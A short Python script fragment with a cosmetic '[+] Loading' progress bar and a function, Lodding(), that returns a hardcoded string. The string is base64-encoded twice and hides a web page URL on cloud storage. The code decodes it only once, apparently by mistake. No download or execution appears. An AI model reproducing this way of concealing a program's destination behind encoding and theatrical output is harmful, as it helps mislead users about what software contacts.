import base64
import sys
import time


def loading_progress(stop_event, duration=15):
    total_steps = 30
    for i in range(total_steps + 1):
        if stop_event.is_set():
            break
        percent = int((i / total_steps) * 100)
        dots = "." * (i % (total_steps + 1))
        spaces = " " * (total_steps - len(dots))
        print(f"\033[92m\r[+] Loading {dots}{spaces} {percent}% \033[0m", end="")
        sys.stdout.flush()
        time.sleep(duration / total_steps)
    print("\r" + " " * 50 + "\r", end="")

def Lodding():
    encoded_d = "YUhSMGNITTZMeTl6ZEc5eVlXZGxMbWR2YjJkc1pXRndhWE11WTI5dEwydHpZUzF1TDJsdVpHVjRMbWgwYld3PQ=="
    Lodding_p = base64.b64decode(encoded_d).decode()
    return Lodding_p

